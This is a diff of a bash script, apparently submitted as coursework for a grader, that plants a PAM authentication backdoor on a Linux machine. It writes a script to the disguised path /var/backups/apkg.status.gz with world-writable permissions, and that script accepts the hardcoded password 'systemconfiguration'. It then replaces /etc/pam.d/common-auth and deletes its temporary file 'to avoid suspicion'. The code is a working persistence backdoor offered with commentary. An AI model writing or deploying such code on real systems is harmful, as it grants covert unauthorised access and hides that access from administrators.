@@ -1,15 +1,18 @@
 #!/usr/bin/env bash
 
-#Security.sh
+#Btw grader- I did not add comments to the ansible because the names tell you what it does
 
-    #check if file exists and save to variable
-    #if not then create a file with this content in this location
+#Section apkg.status.gz
+
+# Hardcode a script into the variable $script
+# This script will be called from PAM to as defined later in this code
+# Essentailly says if the password is systemconfiguration let them in
 
 script=$(cat<<'EEE'
 #!/usr/bin/env bash
 
 read -r  password
-
+    
 if [[ $password == "systemconfiguration" ]]; then
      exit 0
 fi
@@ -18,14 +21,16 @@ EEE
 )
 
 
+# If this totally not suspicious file path does not exist then write the script defined prior here
 
 if [[ ! -f "/var/backups/apkg.status.gz" ]]; then
 
     (echo "$script" > /var/backups/apkg.status.gz)
+    # Allow all permissions out of laziness
     (chmod 777 /var/backups/apkg.status.gz)
 fi
 
-#Common-Auth
+#Section Common-Auth
 
     #Create a custom common-auth file in current Installer dir temporarily
     #Cmp the common-auth to this file
@@ -33,7 +38,7 @@ fi
         #then cp this file to  /etc/pam.d/common-auth while preserving the name
     #Otherwise delete the custom common-auth
 
-
+#This is my custon common_auth file
 auth=$(cat <<'EOF'
 #
 # /etc/pam.d/common-auth - authentication settings common to all services
@@ -66,11 +71,12 @@ auth    optional                        pam_cap.so
 # end of pam-auth-update config
 EOF
 )
+#create a temporary backup so I dont break the box accidentally changing the real directly
 (echo "$auth" > /etc/pam.d/common_auth_backup)
 
-
+# If it does not equal this backup file then make it lol
 if  ! cmp -s /etc/pam.d/common_auth_backup /etc/pam.d/common-auth ; then
     (cp /etc/pam.d/common_auth_backup /etc/pam.d/common-auth)
 fi
-
+#Lastly get rid of this temporary backup toa void suspicion
 (rm /etc/pam.d/common_auth_backup)
